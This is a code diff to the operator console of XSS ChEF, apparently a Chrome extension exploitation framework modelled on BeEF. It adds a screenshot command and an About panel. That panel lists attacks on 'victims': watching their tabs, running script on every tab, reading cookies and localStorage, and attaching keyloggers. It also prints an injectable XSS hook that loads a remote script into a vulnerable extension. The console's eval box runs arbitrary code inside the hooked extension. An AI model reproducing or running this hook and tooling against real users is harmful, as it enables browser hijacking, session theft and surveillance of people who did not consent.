@@ -14,17 +14,24 @@ overflow-y: auto;
 background-color: #0088CC !important;
 color: #FFFFFF !important;
 }
+.modal {
+display:none;
+}
 </style>
 <body>
 <div class="navbar navbar-fixed-top">
     <div class="navbar-inner">
         <div class="container">
-            <span class="brand">Exploiter console</span>
+        <ul class="nav pull-right">
+            <li><a href="#" id=show-about>About</a></li>
+        </ul>
+            <a class="brand"  href="#">XSS <abbr title="Chrome exploitation framework">ChEF</abbr> console by @kkotowicz</a>
         </div>
     </div>
 </div>
 <div class="container">
     <div class="row">
+        <!--
         <div class="span2">
             <div class="well" style="padding: 8px 0;">
                 <ul class="nav nav-list">
@@ -38,21 +45,20 @@ color: #FFFFFF !important;
                     </li>
                 </ul>
             </div>
-            <button id=refresh-hook class='btn btn-secondary'>Refresh hook</button>
-            <button id=fix-server class='btn btn-secondary'>Fix server</button>
-
         </div>
-        <div class="span10">
+        -->
+        <div class="span12">
             <div class="tabbable">
                 <ul class="nav nav-tabs">
                     <li class="active"><a href="#tab-tabs" class='active' data-toggle="tab">Tabs</a></li>
                     <li><a href="#tab-ext-info" data-toggle="tab">Extension info</a></li>
                     <li><a href="#tab-ext-commands" data-toggle="tab">Commands</a></li>
+                    <li><button id=refresh-hook class='btn btn-secondary'><i class="icon-refresh"></i> Refresh hook</button> </li>                    
                 </ul>
                 <div class="tab-content">
                     <div class="tab-pane active" id="tab-tabs">
                         <div class="row">
-                            <div class="span5" id="tabs-container">
+                            <div class="span4" id="tabs-container">
                                 <table class="table-striped table table-condensed">
                                 <thead>
                                 <tr>
@@ -79,7 +85,7 @@ color: #FFFFFF !important;
                                     </tbody>
                                     </table>
                                 </div>
-                                <div class="span5">
+                                <div class="span8">
                                     <div class="tabbable">
                                         <ul class="nav nav-tabs">
                                             <li class="active"><a href="#tab-info" class='active' data-toggle="tab">Info</a></li>
@@ -145,16 +151,17 @@ color: #FFFFFF !important;
                         </form>
                         </div>
                         <div class="tab-pane" id="tab-ext-commands">
-                            <p>
-                            <button id=ping class='btn btn-secondary'>Ping</button>                            
-                            </p>
-                            
+                               <ul class="nav nav-pills">
+            <li><button id=fix-server class='btn btn-secondary'><i class="icon-fire"></i> Fix server</button></li>
+            <li><button id=ping class='btn btn-secondary'>Ping</button></li>
+            <li><button id=do-screenshot class='btn btn-secondary'><i class="icon-picture"></i> Screenshot</button></li>
+            </ul>
                             <form action="#">
                                 <label>Eval</label>
-                                <textarea name=eval-ext class="span3" placeholder="alert(/place code to eval in extension/)"></textarea>
-                                <button type="button" id=eval-ext class="btn btn-primary">Eval</button>
+                                <textarea name=eval-ext class="span8" placeholder="alert(/place code to eval in extension/)"></textarea>
+                                <p><button type="button" id=eval-ext class="btn btn-secondary">Eval</button></p>
                                 <label>Result</label>
-                                <textarea id=eval-ext-result class="span3" placeholder="result will be placed here."></textarea>
+                                <textarea id=eval-ext-result class="span8" placeholder="result will be placed here."></textarea>
                             </form>
                             
                         </div>
@@ -166,10 +173,51 @@ color: #FFFFFF !important;
             <div class="span12">
                 <form>
                     <label>Log</label>
-                        <textarea id='log' style="width: 100%"></textarea>
+                        <textarea id='log' style="width: 100%; height: 150px;"></textarea>
                     </div>
                 </div>
             </div>
+            
+<div class="modal" id="screenshot-modal">
+  <div class="modal-header">
+    <a class="close" data-dismiss="modal">&times;</a>
+    <h3>Screenshot</h3>
+  </div>
+  <div class="modal-body">
+    <img id=screenshot />
+  </div>
+  <div class="modal-footer">
+  </div>
+</div>
+
+<div class="modal" id="about-modal">
+  <div class="modal-header">
+    <a class="close" data-dismiss="modal">&times;</a>
+    <h3>About</h3>
+  </div>
+  <div class="modal-body">
+      <h2>XSS <abbr title="Chrome exploitation framework">ChEF</a></h2>
+      <h3>by <a href="http://blog.kotowicz.net">Krzysztof Kotowicz</a>
+      <p>v.0.1</p>
+      <h4>About</h4>
+      <p>This is a Chrome Exploitation Framework - think <a href="http://www.bindshell.net/tools/beef.html">BeEF</a> for Chrome extensions.
+      Whenever you encounter a XSS vulnerability in Chrome extension, ChEF will demonstrate what is possible. And what is possible (provided the extension had appropriate permissions)?
+      <ul>
+      <li>Monitoring open tabs of victims</li>
+      <li>JS execution (XSS) on every tab</li>
+      <li>HTML extraction, reading cookies, localStorage</li>
+      <li>Persistence until browser is closed (or even futher if you can persist in extensions' localStorage)</li>
+      <li>Screenshot of your windows</li>
+      <li>Further exploitation e.g. via attaching BeEF hooks, keyloggers etc.</li>
+      </ul>
+      <h4>How to use?</h4>
+      <p>Inject Chrome extension with a hook like this: 
+      <pre>&lt;img src=x onerror="if(location.protocol.indexOf('chrome')==0){d=document;e=createElement('script');e.src='http://dev.localhost/xss-chef/xsschef.js';d.body.appendChild(e);}"&gt;</pre>
+      <p>Launch this console and start having fun!
+  </div>
+  <div class="modal-footer">
+  </div>
+</div>
 <script>
 
 // current hook name
@@ -316,6 +364,11 @@ function processResponse(r, hook) {
             hookStorage.updateTab(hook, r.id, r.result);
             refreshTabsTable(hookStorage.getTabs(hook));
         break;
+        case 'recvscreenshot':
+            $("#screenshot").attr('src', r.url);
+            $('#screenshot-modal').modal('show');
+            break;
+        break;        
         case 'recveval':
             if (!r.id) {
                 $('#eval-ext-result').val(JSON.stringify(r.result));
@@ -338,6 +391,15 @@ function processResponse(r, hook) {
 }
 $(function() {
     
+    $('#do-screenshot').click(function() {
+        sendCmd('screenshot');
+    });
+    
+    $('#show-about').click(function(){
+        $('#about-modal').modal('show');
+        return false;
+    }); 
+
     $('#eval-ext').click(function() {
         sendCmd('eval', $('[name=eval-ext]').val());
         $('#eval-ext-result').val('');
